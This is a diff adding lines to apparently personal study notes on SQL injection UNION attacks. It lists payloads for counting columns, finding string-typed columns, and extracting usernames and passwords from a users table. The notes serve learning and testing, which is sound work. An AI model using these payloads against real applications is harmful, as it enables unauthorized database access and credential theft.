@@ -50,3 +50,27 @@ etc.
 ![image](https://user-images.githubusercontent.com/37367596/192006415-207e60bb-4977-4895-9a57-43fed4f6c250.png)
 
 
+The application might actually return the **database error** in its HTTP response, or it might return a **generic error**, or simply return **no results**
+
+**The second method** involves submitting a series of UNION SELECT payloads specifying a different number of null values
+
+' UNION SELECT NULL—
+
+ ' UNION SELECT NULL,NULL—
+ 
+ ' UNION SELECT NULL,NULL,NULL– 
+
+' UNION SELECT NULL FROM DUAL--     (oracale database)
+
+**Finding columns with a useful data type(string/int/or other types) in an SQL injection UNION attack**
+
+' UNION SELECT NULL,NULL,NULL,'a'—
+
+' UNION SELECT NULL,'a',NULL,NULL—
+
+' UNION SELECT username, password(coloumns) FROM users– (table)
+
+![image](https://user-images.githubusercontent.com/37367596/192007589-7f01ddc9-e5a5-40a5-8004-c2c116e0ca55.png)
+
+
+
